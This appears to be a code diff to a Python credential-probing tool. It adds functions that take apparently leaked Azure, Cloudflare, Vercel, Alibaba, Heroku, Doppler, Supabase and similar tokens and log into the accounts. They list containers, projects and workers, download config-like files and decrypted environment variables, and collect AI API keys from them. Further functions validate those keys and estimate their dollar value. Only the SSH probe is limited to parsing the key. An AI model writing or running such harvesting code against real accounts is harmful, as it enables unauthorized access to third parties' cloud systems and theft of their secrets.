@@ -936,6 +936,687 @@ async def probe_aws(cred: str) -> dict:
         return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}
 
 
+# ── Azure storage probe ─────────────────────────────────────────────────────
+# Connection string format:
+#   DefaultEndpointsProtocol=https;AccountName=<n>;AccountKey=<key>;EndpointSuffix=core.windows.net
+# Or BlobEndpoint=https://<n>.blob.core.windows.net/...
+
+_AZURE_ACCT_RE   = re.compile(r'AccountName=([^;]+)', re.IGNORECASE)
+_AZURE_KEY_RE    = re.compile(r'AccountKey=([^;]+)', re.IGNORECASE)
+_AZURE_BLOB_EP_RE = re.compile(r'BlobEndpoint=https?://([^;/]+)', re.IGNORECASE)
+
+
+async def probe_azure(cred: str) -> dict:
+    """Azure Storage Account probe. Lists containers, samples blobs whose
+    names suggest config/secrets, regex-scans for AI keys."""
+    try:
+        from azure.storage.blob import BlobServiceClient
+        from azure.core.exceptions import HttpResponseError, ClientAuthenticationError
+    except ImportError:
+        return {"error": "azure_sdk_missing"}
+
+    # Build connection string if cred is just AccountName=X;AccountKey=Y
+    conn_str = cred
+    if "AccountName=" in cred and "AccountKey=" in cred and "DefaultEndpointsProtocol" not in cred:
+        conn_str = "DefaultEndpointsProtocol=https;" + cred + ";EndpointSuffix=core.windows.net"
+
+    out: dict[str, Any] = {
+        "probe_type": "azure_blob",
+        "containers_count": 0,
+        "blobs_sampled": 0,
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+
+    def _do_sync():
+        try:
+            client = BlobServiceClient.from_connection_string(conn_str)
+        except Exception as e:
+            return {"error": f"parse:{type(e).__name__}", "msg": str(e)[:120]}
+
+        text_blob: list[str] = []
+        susp: list[str] = []
+
+        try:
+            containers = list(client.list_containers(timeout=10))
+        except ClientAuthenticationError:
+            return {"error": "invalid_token"}
+        except HttpResponseError as e:
+            return {"error": f"http:{e.status_code or '?'}", "msg": str(e)[:120]}
+        except Exception as e:
+            return {"error": f"list:{type(e).__name__}", "msg": str(e)[:120]}
+
+        out["containers_count"] = len(containers)
+
+        for cont in containers[:20]:
+            cname = cont.name
+            try:
+                container_client = client.get_container_client(cname)
+                # List up to 200 blobs per container
+                for blob in container_client.list_blobs(results_per_page=200, timeout=10):
+                    bn = blob.name
+                    bn_low = bn.lower()
+                    # Filter blob names — only download those that look like config/secret
+                    if not any(p in bn_low for p in (
+                        ".env", "secret", "config", "credential", "token", "key",
+                        "settings", "app.json", ".cfg", ".ini", ".yaml", ".yml",
+                        ".toml", ".json", ".pem", "vault",
+                    )):
+                        continue
+                    susp.append(f"{cname}/{bn}")
+                    if out["blobs_sampled"] >= 50:
+                        continue   # cap downloads but keep listing names
+                    try:
+                        blob_client = container_client.get_blob_client(bn)
+                        # Cap download at 256 KB
+                        data = blob_client.download_blob(max_concurrency=1, length=262144).readall()
+                        out["blobs_sampled"] += 1
+                        text = data.decode("utf-8", errors="replace")
+                        text_blob.append(text)
+                    except Exception:
+                        pass
+                    if len(susp) >= 100:
+                        break
+            except Exception:
+                continue
+
+        out["suspicious_tables"] = susp[:30]
+        counts, previews, raw = _scan_text("\n".join(text_blob))
+        out["ai_keys_found"] = counts
+        out["ai_keys_total"] = sum(counts.values())
+        out["previews"] = previews
+        out["_raw_keys"] = raw
+        return out
+
+    try:
+        result = await asyncio.to_thread(_do_sync)
+        if isinstance(result, dict) and "_raw_keys" in result:
+            raw = result.pop("_raw_keys")
+            validated, validated_pairs = await _validate_discovered_keys(raw)
+            result["ai_keys_validated"] = validated
+            result["ai_keys_total_valid"] = sum(validated.values())
+            result["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+            result["_validated_pairs"] = validated_pairs
+        return result
+    except Exception as e:
+        return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}
+
+
+# ── Cloudflare probe ────────────────────────────────────────────────────────
+# Extracts API token, verifies it, lists zones + workers + their env vars.
+# Workers env vars often contain user OPENAI_API_KEY etc.
+
+async def probe_cloudflare(token: str) -> dict:
+    import httpx as _httpx
+    out: dict[str, Any] = {
+        "probe_type": "cloudflare",
+        "zones_count": 0,
+        "workers_count": 0,
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+    text_blob: list[str] = []
+    susp: list[str] = []
+
+    headers = {"Authorization": f"Bearer {token}",
+               "Content-Type": "application/json"}
+    base = "https://api.cloudflare.com/client/v4"
+
+    async with _httpx.AsyncClient(timeout=12, follow_redirects=True) as c:
+        try:
+            r = await c.get(f"{base}/user/tokens/verify", headers=headers)
+            if r.status_code == 401:
+                return {"error": "invalid_token"}
+            if r.status_code != 200:
+                return {"error": f"http:{r.status_code}", "msg": r.text[:120]}
+            j = r.json()
+            if not j.get("success"):
+                return {"error": "verify_failed"}
+        except Exception as e:
+            return {"error": f"verify:{type(e).__name__}", "msg": str(e)[:120]}
+
+        # Account discovery
+        try:
+            r = await c.get(f"{base}/accounts", headers=headers)
+            accounts = (r.json() or {}).get("result", [])
+        except Exception:
+            accounts = []
+
+        for acc in accounts[:5]:
+            acc_id = acc.get("id")
+            if not acc_id:
+                continue
+            # Workers — most valuable: list scripts, get bindings (env vars)
+            try:
+                r = await c.get(f"{base}/accounts/{acc_id}/workers/scripts",
+                                headers=headers)
+                workers = (r.json() or {}).get("result", [])
+                out["workers_count"] += len(workers)
+                for w in workers[:30]:
+                    wname = w.get("id") or w.get("name", "")
+                    susp.append(f"worker:{wname}")
+                    # Get bindings (KV, secrets, env vars)
+                    try:
+                        rb = await c.get(
+                            f"{base}/accounts/{acc_id}/workers/scripts/{wname}/settings",
+                            headers=headers,
+                        )
+                        if rb.status_code == 200:
+                            text_blob.append(rb.text)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # Pages projects (often have env vars)
+            try:
+                r = await c.get(f"{base}/accounts/{acc_id}/pages/projects",
+                                headers=headers)
+                projects = (r.json() or {}).get("result", [])
+                for p in projects[:30]:
+                    pname = p.get("name", "")
+                    susp.append(f"pages:{pname}")
+                    # deployment_configs.production.env_vars contains live env
+                    text_blob.append(json.dumps(p.get("deployment_configs", {}),
+                                                  default=str))
+            except Exception:
+                pass
+
+        # Zones (less directly valuable but counts as active surface)
+        try:
+            r = await c.get(f"{base}/zones?per_page=50", headers=headers)
+            zones = (r.json() or {}).get("result", [])
+            out["zones_count"] = len(zones)
+        except Exception:
+            pass
+
+    out["suspicious_tables"] = susp[:30]
+    counts, previews, raw = _scan_text("\n".join(text_blob))
+    out["ai_keys_found"] = counts
+    out["ai_keys_total"] = sum(counts.values())
+    out["previews"] = previews
+    validated, validated_pairs = await _validate_discovered_keys(raw)
+    out["ai_keys_validated"] = validated
+    out["ai_keys_total_valid"] = sum(validated.values())
+    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+    out["_validated_pairs"] = validated_pairs
+    return out
+
+
+# ── Vercel probe ────────────────────────────────────────────────────────────
+
+async def probe_vercel(token: str) -> dict:
+    import httpx as _httpx
+    out: dict[str, Any] = {
+        "probe_type": "vercel",
+        "projects_count": 0,
+        "env_vars_total": 0,
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+    text_blob: list[str] = []
+    susp: list[str] = []
+    headers = {"Authorization": f"Bearer {token}"}
+
+    async with _httpx.AsyncClient(timeout=12) as c:
+        try:
+            r = await c.get("https://api.vercel.com/v2/user", headers=headers)
+            if r.status_code == 401 or r.status_code == 403:
+                return {"error": "invalid_token"}
+            if r.status_code != 200:
+                return {"error": f"http:{r.status_code}", "msg": r.text[:120]}
+        except Exception as e:
+            return {"error": f"verify:{type(e).__name__}", "msg": str(e)[:120]}
+
+        # List projects
+        try:
+            r = await c.get("https://api.vercel.com/v9/projects?limit=100",
+                            headers=headers)
+            projects = (r.json() or {}).get("projects", [])
+            out["projects_count"] = len(projects)
+        except Exception:
+            projects = []
+
+        for p in projects[:50]:
+            pid = p.get("id")
+            pname = p.get("name", "")
+            if not pid:
+                continue
+            try:
+                r = await c.get(
+                    f"https://api.vercel.com/v9/projects/{pid}/env?decrypt=true",
+                    headers=headers,
+                )
+                if r.status_code != 200:
+                    continue
+                envs = (r.json() or {}).get("envs", [])
+                out["env_vars_total"] += len(envs)
+                for e in envs:
+                    ename = e.get("key", "")
+                    if _SUSPICIOUS_NAME.search(ename):
+                        susp.append(f"{pname}:{ename}")
+                    val = e.get("value")
+                    if val:
+                        text_blob.append(f"{ename}={val}")
+            except Exception:
+                pass
+
+    out["suspicious_tables"] = susp[:30]
+    counts, previews, raw = _scan_text("\n".join(text_blob))
+    out["ai_keys_found"] = counts
+    out["ai_keys_total"] = sum(counts.values())
+    out["previews"] = previews
+    validated, validated_pairs = await _validate_discovered_keys(raw)
+    out["ai_keys_validated"] = validated
+    out["ai_keys_total_valid"] = sum(validated.values())
+    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+    out["_validated_pairs"] = validated_pairs
+    return out
+
+
+# ── Generic infra-token probes (Heroku, Fly, Netlify, DigitalOcean, …) ───────
+
+# Each entry: provider → (verify_url, header_template, list_endpoints).
+# verify_url is GET-able and returns 401 on dead keys; the list_endpoints
+# return JSON we scan for AI keys.
+_GENERIC_INFRA: dict[str, dict] = {
+    "heroku": {
+        "verify": "https://api.heroku.com/account",
+        "headers": lambda t: {"Authorization": f"Bearer {t}",
+                              "Accept": "application/vnd.heroku+json; version=3"},
+        "lists": [
+            "https://api.heroku.com/apps",                 # list apps
+            # then per-app /apps/{id}/config-vars (handled inline below)
+        ],
+        "per_app": {
+            "list_url": "https://api.heroku.com/apps",
+            "name_field": "name",
+            "child_url": "https://api.heroku.com/apps/{name}/config-vars",
+        },
+    },
+    "fly": {
+        "verify": "https://api.fly.io/graphql",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": [],
+        "graphql": {
+            "url": "https://api.fly.io/graphql",
+            "query": '{"query":"query { apps { nodes { name secrets { name digest } } } }"}',
+        },
+    },
+    "netlify": {
+        "verify": "https://api.netlify.com/api/v1/user",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": [],
+        "per_app": {
+            "list_url": "https://api.netlify.com/api/v1/sites",
+            "name_field": "id",
+            "child_url": "https://api.netlify.com/api/v1/sites/{name}/env",
+        },
+    },
+    "digitalocean": {
+        "verify": "https://api.digitalocean.com/v2/account",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": [
+            "https://api.digitalocean.com/v2/apps",
+            "https://api.digitalocean.com/v2/databases",
+        ],
+    },
+    "linode": {
+        "verify": "https://api.linode.com/v4/account",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": ["https://api.linode.com/v4/databases/instances"],
+    },
+    "hetzner": {
+        "verify": "https://api.hetzner.cloud/v1/servers",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": ["https://api.hetzner.cloud/v1/servers"],
+    },
+    "vultr": {
+        "verify": "https://api.vultr.com/v2/account",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": ["https://api.vultr.com/v2/instances"],
+    },
+    "doppler": {
+        "verify": "https://api.doppler.com/v3/me",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": [],
+        "per_app": {
+            "list_url": "https://api.doppler.com/v3/projects",
+            "name_field": "id",
+            "child_url": "https://api.doppler.com/v3/configs/config/secrets/download?project={name}&config=prd&format=json",
+        },
+    },
+    "railway": {
+        "verify": "https://backboard.railway.app/graphql/v2",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": [],
+        "graphql": {
+            "url": "https://backboard.railway.app/graphql/v2",
+            "query": '{"query":"query { me { projects { edges { node { id name services { edges { node { id name variables { edges { node { name value } } } } } } } } } } }"}',
+        },
+    },
+    "supabase": {
+        "verify": "https://api.supabase.com/v1/projects",
+        "headers": lambda t: {"Authorization": f"Bearer {t}"},
+        "lists": ["https://api.supabase.com/v1/projects"],
+        "per_app": {
+            "list_url": "https://api.supabase.com/v1/projects",
+            "name_field": "id",
+            "child_url": "https://api.supabase.com/v1/projects/{name}/secrets",
+        },
+    },
+    "vault": {  # HashiCorp Vault — needs VAULT_ADDR (skip generic, special-case)
+        "verify": None,
+    },
+    "tfc": {    # Terraform Cloud
+        "verify": "https://app.terraform.io/api/v2/account/details",
+        "headers": lambda t: {"Authorization": f"Bearer {t}",
+                              "Content-Type": "application/vnd.api+json"},
+        "lists": ["https://app.terraform.io/api/v2/organizations"],
+    },
+}
+
+
+async def probe_generic_infra(provider: str, token: str) -> dict:
+    """Generic verify+enum for deploy/infra tokens. Returns probe_type
+    set to provider name."""
+    import httpx as _httpx
+    cfg = _GENERIC_INFRA.get(provider)
+    if not cfg or not cfg.get("verify"):
+        return {"probe_type": provider, "skipped": "unsupported_provider"}
+
+    out: dict[str, Any] = {
+        "probe_type": provider,
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+    text_blob: list[str] = []
+    susp: list[str] = []
+    headers = cfg["headers"](token)
+
+    async with _httpx.AsyncClient(timeout=12, follow_redirects=True) as c:
+        try:
+            r = await c.get(cfg["verify"], headers=headers)
+            if r.status_code in (401, 403):
+                return {"error": "invalid_token", "code": r.status_code}
+            if r.status_code >= 500:
+                return {"error": f"server:{r.status_code}"}
+            if r.status_code != 200:
+                return {"error": f"http:{r.status_code}", "msg": r.text[:120]}
+        except Exception as e:
+            return {"error": f"verify:{type(e).__name__}", "msg": str(e)[:120]}
+
+        # Top-level lists
+        for url in cfg.get("lists", []):
+            try:
+                r = await c.get(url, headers=headers)
+                if r.status_code == 200:
+                    text_blob.append(r.text)
+                    susp.append(url.split("/")[-1])
+            except Exception:
+                pass
+
+        # GraphQL queries
+        gq = cfg.get("graphql")
+        if gq:
+            try:
+                r = await c.post(gq["url"], headers=headers, content=gq["query"])
+                if r.status_code == 200:
+                    text_blob.append(r.text)
+                    susp.append("graphql:variables")
+            except Exception:
+                pass
+
+        # Per-app drill-down
+        per_app = cfg.get("per_app")
+        if per_app:
+            try:
+                r = await c.get(per_app["list_url"], headers=headers)
+                if r.status_code == 200:
+                    j = r.json()
+                    items = j if isinstance(j, list) else (
+                        j.get("apps") or j.get("sites") or j.get("projects") or
+                        j.get("data") or j.get("data", {}).get("apps", []) or []
+                    )
+                    name_field = per_app["name_field"]
+                    for it in (items or [])[:20]:
+                        if not isinstance(it, dict):
+                            continue
+                        name = it.get(name_field)
+                        if not name:
+                            continue
+                        url = per_app["child_url"].replace("{name}", str(name))
+                        try:
+                            rc = await c.get(url, headers=headers)
+                            if rc.status_code == 200:
+                                text_blob.append(rc.text)
+                                susp.append(f"{provider}:{name}")
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+
+    out["suspicious_tables"] = susp[:30]
+    counts, previews, raw = _scan_text("\n".join(text_blob))
+    out["ai_keys_found"] = counts
+    out["ai_keys_total"] = sum(counts.values())
+    out["previews"] = previews
+    validated, validated_pairs = await _validate_discovered_keys(raw)
+    out["ai_keys_validated"] = validated
+    out["ai_keys_total_valid"] = sum(validated.values())
+    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+    out["_validated_pairs"] = validated_pairs
+    return out
+
+
+# ── Alibaba Cloud probe (OSS list, RAM enum) ────────────────────────────────
+
+_ALI_REGIONS = ["cn-hangzhou", "cn-shanghai", "cn-beijing", "ap-southeast-1"]
+
+
+def _ali_signed_request_headers(method: str, host: str, path: str,
+                                 access_key_id: str, access_key_secret: str) -> dict:
+    """Build minimal signed headers for OSS GetService (list buckets)."""
+    import hmac, hashlib as _hl, base64 as _b64
+    from email.utils import formatdate
+    date_hdr = formatdate(usegmt=True)
+    string_to_sign = f"{method}\n\n\n{date_hdr}\n/"
+    sig = _b64.b64encode(
+        hmac.new(access_key_secret.encode(), string_to_sign.encode(),
+                  _hl.sha1).digest()
+    ).decode()
+    return {
+        "Date": date_hdr,
+        "Authorization": f"OSS {access_key_id}:{sig}",
+        "Host": host,
+    }
+
+
+async def probe_alibaba(cred: str) -> dict:
+    """Probe Alibaba Cloud: list OSS buckets, sample suspicious-named blobs.
+    cred format from extract_alibaba: 'LTAI...:secret@region'."""
+    import httpx as _httpx
+
+    m = re.match(r"^(LTAI[A-Za-z0-9]+|STS\.[A-Za-z0-9]+):([^@]+)@?(.*)?", cred)
+    if not m:
+        return {"error": "format"}
+    kid = m.group(1)
+    secret = m.group(2)
+    if "secret_unknown" in secret or len(secret) < 20:
+        return {"error": "secret_missing"}
+
+    out: dict[str, Any] = {
+        "probe_type": "alibaba",
+        "buckets_count": 0,
+        "regions_probed": [],
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+    text_blob: list[str] = []
+    susp: list[str] = []
+
+    async with _httpx.AsyncClient(timeout=12) as c:
+        # OSS list buckets — try regions
+        for region in _ALI_REGIONS:
+            host = f"oss-{region}.aliyuncs.com"
+            url = f"https://{host}/"
+            headers = _ali_signed_request_headers("GET", host, "/", kid, secret)
+            try:
+                r = await c.get(url, headers=headers)
+            except Exception:
+                continue
+            if r.status_code == 403 and "InvalidAccessKeyId" in (r.text or ""):
+                return {"error": "invalid_token"}
+            if r.status_code != 200:
+                continue
+            out["regions_probed"].append(region)
+            # Parse bucket names from XML
+            for bm in re.finditer(r"<Name>([^<]+)</Name>", r.text):
+                bname = bm.group(1)
+                susp.append(f"oss:{bname}")
+                out["buckets_count"] += 1
+                # Try listing blobs in this bucket (cap to first 5 buckets)
+                if len([s for s in susp if s.startswith("oss:")]) > 5:
+                    continue
+                bhost = f"{bname}.{host}"
+                try:
+                    bheaders = _ali_signed_request_headers("GET", bhost, "/",
+                                                           kid, secret)
+                    rb = await c.get(f"https://{bhost}/?max-keys=100",
+                                     headers=bheaders)
+                    if rb.status_code == 200:
+                        # Find suspicious-named keys
+                        for km in re.finditer(r"<Key>([^<]+)</Key>", rb.text):
+                            kn = km.group(1)
+                            if any(p in kn.lower() for p in
+                                   (".env", "secret", "config", "credential",
+                                    "key", "token")):
+                                susp.append(f"oss:{bname}/{kn}")
+                                # Download (cap 256KB)
+                                try:
+                                    do_url = f"https://{bhost}/{kn}"
+                                    do_h = _ali_signed_request_headers(
+                                        "GET", bhost, f"/{kn}", kid, secret)
+                                    rd = await c.get(do_url, headers=do_h)
+                                    if rd.status_code == 200:
+                                        text_blob.append(rd.text[:262144])
+                                except Exception:
+                                    pass
+                except Exception:
+                    pass
+            # Found something — no need to continue regions
+            if out["buckets_count"] > 0:
+                break
+
+    out["suspicious_tables"] = susp[:30]
+    counts, previews, raw = _scan_text("\n".join(text_blob))
+    out["ai_keys_found"] = counts
+    out["ai_keys_total"] = sum(counts.values())
+    out["previews"] = previews
+    validated, validated_pairs = await _validate_discovered_keys(raw)
+    out["ai_keys_validated"] = validated
+    out["ai_keys_total_valid"] = sum(validated.values())
+    out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+    out["_validated_pairs"] = validated_pairs
+    return out
+
+
+# ── Detect provider from infra-token cred ───────────────────────────────────
+# Cred format from extract_infra: "<ENV_NAME>=<value>"
+# Map env var prefix → generic provider.
+
+_INFRA_TOKEN_PROVIDER: list[tuple[re.Pattern, str]] = [
+    (re.compile(r'^CLOUDFLARE_|^CF_API'),                   "cloudflare"),
+    (re.compile(r'^VERCEL_'),                                "vercel"),
+    (re.compile(r'^HEROKU_'),                                "heroku"),
+    (re.compile(r'^FLY_'),                                   "fly"),
+    (re.compile(r'^NETLIFY_'),                               "netlify"),
+    (re.compile(r'^DIGITALOCEAN_|^DO_ACCESS'),              "digitalocean"),
+    (re.compile(r'^LINODE_'),                                "linode"),
+    (re.compile(r'^HETZNER_|^HCLOUD_'),                     "hetzner"),
+    (re.compile(r'^VULTR_'),                                 "vultr"),
+    (re.compile(r'^DOPPLER_'),                               "doppler"),
+    (re.compile(r'^RAILWAY_'),                               "railway"),
+    (re.compile(r'^SUPABASE_(?:ACCESS_TOKEN|SERVICE_ROLE_KEY|API_TOKEN)'), "supabase"),
+    (re.compile(r'^TFC_|^TERRAFORM_CLOUD|^TFE_'),           "tfc"),
+]
+
+
+def _detect_infra_provider(cred: str) -> tuple[str, str] | None:
+    """Returns (provider, token_value) or None."""
+    if "=" not in cred:
+        return None
+    env_name, _, value = cred.partition("=")
+    env_name = env_name.strip().upper()
+    value = value.strip().strip('"').strip("'")
+    for pat, prov in _INFRA_TOKEN_PROVIDER:
+        if pat.match(env_name):
+            return prov, value
+    return None
+
+
+# ── SSH probe (lightweight: structural + banner only, no shell) ────────────
+
+async def probe_ssh(cred: str) -> dict:
+    """SSH probe — DELIBERATELY MINIMAL. We only:
+      1. Structurally validate the PEM/OpenSSH key parses
+      2. Optionally derive fingerprint
+    We DO NOT establish a shell, run commands, or read files on the remote
+    system — that would be active intrusion. The owner can be informed
+    'a working SSH key was found in your repo' which is actionable on its own.
+    """
+    out: dict[str, Any] = {
+        "probe_type": "ssh",
+        "key_type": "",
+        "fingerprint": "",
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+    if "BEGIN" not in cred:
+        return {"error": "not_pem"}
+    try:
+        from cryptography.hazmat.primitives.serialization import (
+            load_pem_private_key, load_ssh_private_key,
+        )
+        from cryptography.hazmat.primitives import hashes, serialization
+    except ImportError:
+        return {"error": "cryptography_missing"}
+
+    try:
+        key = await asyncio.to_thread(load_pem_private_key, cred.encode(), None)
+    except Exception:
+        try:
+            key = await asyncio.to_thread(load_ssh_private_key, cred.encode(), None)
+        except Exception:
+            return {"error": "key_parse_failed"}
+
+    out["key_type"] = type(key).__name__
+    try:
+        pub = key.public_key().public_bytes(
+            encoding=serialization.Encoding.OpenSSH,
+            format=serialization.PublicFormat.OpenSSH,
+        )
+        h = hashes.Hash(hashes.SHA256())
+        h.update(pub)
+        import base64 as _b64
+        out["fingerprint"] = "SHA256:" + _b64.b64encode(h.finalize()).decode().rstrip("=")
+    except Exception:
+        pass
+    return out
+
+
 # ── Dispatcher ──────────────────────────────────────────────────────────────
 
 async def probe_one(cred_type: str, cred: str) -> dict:
@@ -971,6 +1652,25 @@ async def probe_one(cred_type: str, cred: str) -> dict:
             data = {"probe_type": scheme, "skipped": "unsupported_scheme"}
     elif cred_type == "aws":
         data = await probe_aws(cred)
+    elif cred_type == "azure":
+        data = await probe_azure(cred)
+    elif cred_type == "alibaba":
+        data = await probe_alibaba(cred)
+    elif cred_type == "ssh":
+        data = await probe_ssh(cred)
+    elif cred_type == "infra":
+        # Detect provider from env-name, route to specific probe
+        detected = _detect_infra_provider(cred)
+        if not detected:
+            data = {"probe_type": "infra_unknown", "skipped": "unknown_provider"}
+        else:
+            provider, token = detected
+            if provider == "cloudflare":
+                data = await probe_cloudflare(token)
+            elif provider == "vercel":
+                data = await probe_vercel(token)
+            else:
+                data = await probe_generic_infra(provider, token)
     else:
         data = {"probe_type": cred_type, "skipped": "type_not_implemented"}
 
